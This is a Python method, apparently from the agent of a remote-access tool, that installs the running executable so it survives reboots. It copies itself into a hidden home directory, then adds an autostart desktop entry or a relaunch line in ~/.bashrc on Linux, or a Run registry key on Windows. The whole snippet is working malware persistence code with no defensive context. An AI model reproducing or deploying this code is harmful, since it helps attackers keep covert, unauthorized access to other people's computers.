def persist(self):
        """ Installs the agent """
        if not getattr(sys, 'frozen', False):
            return "Persistence only supported on compiled agents."
        if self.is_installed():
            return "agent seems to be already installed."
        if platform.system() == 'Linux':
            persist_dir = self.expand_path('~/.%s' % config.AGENT_NAME)
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            os.system('chmod +x ' + agent_path)
            if os.path.exists(self.expand_path("~/.config/autostart/")):
                desktop_entry = "[Desktop Entry]\nVersion=1.0\nType=Application\nName=%s\nExec=%s\n" % (config.AGENT_NAME, agent_path)
                with open(self.expand_path('~/.config/autostart/%s.desktop' % config.AGENT_NAME), 'w') as f:
                    f.write(desktop_entry)
            else:
                with open(self.expand_path("~/.bashrc"), "a") as f:
                    f.write("\n(if [ $(ps aux|grep " + os.path.basename(
                        sys.executable) + "|wc -l) -lt 2 ]; then " + agent_path + ";fi&)\n")
        elif platform.system() == 'Windows':
            persist_dir = os.path.join(os.getenv('USERPROFILE'), config.AGENT_NAME)
            if not os.path.exists(persist_dir):
                os.makedirs(persist_dir)
            agent_path = os.path.join(persist_dir, os.path.basename(sys.executable))
            shutil.copyfile(sys.executable, agent_path)
            cmd = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d \"%s\"" % (config.AGENT_NAME, agent_path)
            subprocess.Popen(cmd, shell=True)
        return "agent installed."
        